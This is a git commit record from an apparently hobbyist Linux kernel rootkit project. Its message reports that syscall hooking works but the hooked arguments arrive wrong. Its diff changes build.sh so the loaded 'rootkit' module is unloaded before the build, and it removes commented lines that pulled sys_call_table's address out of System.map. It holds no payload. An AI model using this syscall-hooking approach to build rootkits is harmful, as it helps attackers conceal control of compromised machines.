81f756ef5ebea62baeaf757063442e8a16001525
klesoft <davidete345@gmail.com>
2019-12-16 15:59:09 +0100

    Hooking works but arguments are bad, will switch to lower kernel
    Added a rootkit.c.dumper, which is my failed attempt to discover why arguments
    to hooked functions are bad received. I will switch from kernel 5.0 to 4.4
    and then try again.

--- build.sh
+++ build.sh
@@ -2,18 +2,15 @@
 
 #make clean
 
-#syscall_table=$(sudo cat /boot/System.map-5.0.0-37-generic | grep "\Wsys_call_table$" | cut -d " " -f 1)
-#echo "#pragma once" > sys.h
-#echo "void** sys_call_table = (void**)0x$syscall_table;" >> sys.h
+already=$(lsmod | grep rootkit)
+if [ -n "$already" ]; then
+    echo "Removing already present rootkit"
+    sudo rmmod rootkit
+fi
 
 make
 
 if [ $? -eq 0 ]; then
-	already=$(lsmod | grep rootkit)
-	if [ -n "$already" ]; then
-		echo "Removing already present rootkit"
-		sudo rmmod rootkit
-	fi
 	sudo insmod rootkit.ko
 
 	if [ $? -eq 0 ]; then
